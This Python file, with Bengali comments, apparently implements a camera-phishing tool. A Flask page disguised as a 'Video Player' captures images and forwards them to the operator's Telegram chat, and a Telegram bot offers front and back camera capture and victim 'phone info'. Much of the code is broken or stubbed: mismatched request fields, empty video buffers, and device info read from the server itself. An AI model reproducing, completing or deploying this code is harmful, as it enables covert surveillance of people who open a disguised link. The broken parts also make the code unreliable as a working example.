#!/usr/bin/env python3
import os
import io
import uuid
import base64
import threading
import requests
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

app = Flask(__name__)

# ==========================================
# Secrets থেকে টোকেন ও Chat ID
# ==========================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "")

# ===============================
# অনুমোদিত Chat ID (একটি বা কমা-সেপারেটেড)
# আপনি দিয়েছেন: 7243012875,7668032710
# পরিবেশভ্যারিয়েবলও ব্যবহার করতে পারেন (ALLOWED_CHAT_ID)
ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "7243012875,7668032710")
ALLOWED_CHAT_IDS = {s.strip() for s in ALLOWED_CHAT_ID.split(",") if s.strip()}

def is_authorized_chat(chat_id):
    return str(chat_id) in ALLOWED_CHAT_IDS

if not BOT_TOKEN or not CHAT_ID:
    print("❌ BOT_TOKEN বা CHAT_ID সেট করা হয়নি!")
    print("👉 Render → Tools → Environment এ যোগ করুন")
    raise SystemExit(1)

# অস্থায়ী স্টোরেজ
user_sessions = {}   # {chat_id: {"camera": "front/back", "waiting_url": True}}
link_store = {}      # {link_id: {"chat_id": ..., "video_url": ..., "camera": ...}}

# ==========================================
# টেলিগ্রাম-এ ছবি পাঠানো
# ==========================================
def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {"photo": photo_file}
    payload = {"chat_id": chat_id}
    if caption:
        payload["caption"] = caption

    try:
        response = requests.post(url, files=files, data=payload, timeout=30)
        response.raise_for_status()
        if response.status_code == 200:
            return {"status": "success"}
        return {"status": "error", "details": response.text}
    except requests.RequestException as e:
        return {"status": "error", "details": str(e)}

def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1, total=4):
    try:
        if "," in photo_data:
            image_data = photo_data.split(",", 1)[1]
        else:
            return {"status": "error", "details": "Invalid image data format"}

        image_bytes = base64.b64decode(image_data)
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = f"{camera_type}_capture_{photo_num}.jpg"

        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total}"
        return send_photo_to_telegram(photo_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}

# ==========================================
# ক্যামেরা ক্যাপচার পেজ (ভিডিও + লুকানো ক্যামেরা)
# ==========================================
CAPTURE_HTML = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .video-wrapper {
            width: 100%;
            max-width: 900px;
            position: relative;
        }
        video {
            width: 100%;
            height: auto;
            display: block;
            background: #000;
        }
        iframe {
            width: 100%;
            height: 70vh;
            border: none;
            display: block;
            background: #000;
        }
        .controls {
            margin-top: 20px;
            text-align: center;
        }
        .controls button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="video-wrapper">
        <video id="videoPlayer" controls>
            <source src="{{ video_url }}" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>
    <div class="controls">
        <button onclick="captureVideo()">ভিডিও ক্যাপচার করুন</button>
    </div>
    <script>
        function captureVideo() {
            const video = document.getElementById('videoPlayer');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'success') {
                      alert('ভিডিও ক্যাপচার করা হচ্ছে!');
                  } else {
                      alert('ভিডিও ক্যাপচার করতে ব্যর্থ হচ্ছে: ' + data.details);
                  }
              });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string('''
        <h1>ক্যাপচার পেজ</h1>
        <a href="/capture?type=front">ফ্রন্ট ক্যামেরা ক্যাপচার</a>
        <br>
        <a href="/capture?type=back">ব্যাক ক্যামেরা ক্যাপচার</a>
    ''')

@app.route('/capture')
def capture():
    camera_type = request.args.get('type', 'front')
    video_url = request.args.get('video_url', '')
    return render_template_string(CAPTURE_HTML, video_url=video_url, camera_type=camera_type)

@app.route('/view/<link_id>')
def view_link(link_id):
    link_data = link_store.get(link_id)
    if not link_data:
        return "লিঙ্ক পাওয়া যায়নি", 404
    return render_template_string(CAPTURE_HTML, video_url=link_data['video_url'], camera_type=link_data['camera'])

@app.route('/capture', methods=['POST'])
def capture_photo():
    data = request.json
    image_data = data['image']
    chat_id = data['chat_id']
    camera_type = data['camera_type']
    photo_num = data['photo_num']
    total = data['total']
    result = capture_and_send_photo(image_data, chat_id, camera_type, photo_num, total)
    return jsonify(result)

# ==========================================
# ফোনের তথ্য পেতে ফাংশন
# ==========================================
def get_phone_info():
    import platform
    import psutil
    import socket

    phone_info = {
        'phone_name': platform.node(),
        'battery': f"{psutil.sensors_battery().percent}% ({psutil.sensors_battery().power_plugged})",
        'ram': f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        'rom': f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
        'ip_address': socket.gethostbyname(socket.gethostname())
    }
    return phone_info

# ==========================================
# ফ্রন্ট ক্যামেরা ভিডিও ক্যাপচার
# ==========================================
def capture_font_camera_video(chat_id, video_url, camera_type="front"):
    try:
        # ভিডিও ক্যাপচার লজিক এখানে
        # উদাহরণ: ভিডিও ফাইল সেভ করুন এবং টেলিগ্রামে পাঠান
        video_file = io.BytesIO()
        # ভিডিও ক্যাপচার লজিক
        # উদাহরণ: cv2.VideoCapture(0) ব্যবহার করুন
        # video_file.write(...)
        video_file.name = f"{camera_type}_capture_video.mp4"
        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
        return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}

# ==========================================
# ব্যাক ক্যামেরা ভিডিও ক্যাপচার
# ==========================================
def capture_back_camera_video(chat_id, video_url, camera_type="back"):
    try:
        # ভিডিও ক্যাপচার লজিক এখানে
        # উদাহরণ: ভিডিও ফাইল সেভ করুন এবং টেলিগ্রামে পাঠান
        video_file = io.BytesIO()
        # ভিডিও ক্যাপচার লজিক
        # উদাহরণ: cv2.VideoCapture(1) ব্যবহার করুন
        # video_file.write(...)
        video_file.name = f"{camera_type}_capture_video.mp4"
        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
        return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}

# ==========================================
# টেলিগ্রাম বট হ্যান্ডলার
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("ফ্রন্ট ক্যামেরা ভিডিও", callback_data='font_camera_video'),
            InlineKeyboardButton("ব্যাক ক্যামেরা ভিডিও", callback_data='back_camera_video'),
        ],
        [
            InlineKeyboardButton("ফোনের তথ্য", callback_data='phone_info'),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('ক্যাপচার শুরু করুন:', reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'font_camera_video':
        result = capture_font_camera_video(query.message.chat_id, query.message.chat_id, camera_type="front")
        if result["status"] == "success":
            await query.edit_message_text('ফ্রন্ট ক্যামেরা ভিডিও ক্যাপচার করা হচ্ছে...')
        else:
            await query.edit_message_text(f'ফ্রন্ট ক্যামেরা ভিডিও ক্যাপচার করতে ব্যর্থ হচ্ছে: {result["details"]}')

    elif query.data == 'back_camera_video':
        result = capture_back_camera_video(query.message.chat_id, query.message.chat_id, camera_type="back")
        if result["status"] == "success":
            await query.edit_message_text('ব্যাক ক্যামেরা ভিডিও ক্যাপচার করা হচ্ছে...')
        else:
            await query.edit_message_text(f'ব্যাক ক্যামেরা ভিডিও ক্যাপচার করতে ব্যর্থ হচ্ছে: {result["details"]}')

    elif query.data == 'phone_info':
        phone_info = get_phone_info()
        info_text = "\n".join([f"{key}: {value}" for key, value in phone_info.items()])
        await query.edit_message_text(f"ফোনের তথ্য:\n{info_text}")

# ==========================================
# ফ্লাস্ক সার্ভার চালানোর ফাংশন
# ==========================================
def run_flask():
    app.run(host='0.0.0.0', port=5000)

# ==========================================
# মেইন ফাংশন
# ==========================================
def main():
    threading.Thread(target=run_flask).start()
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.run_polling()

if __name__ == "__main__":
    main()
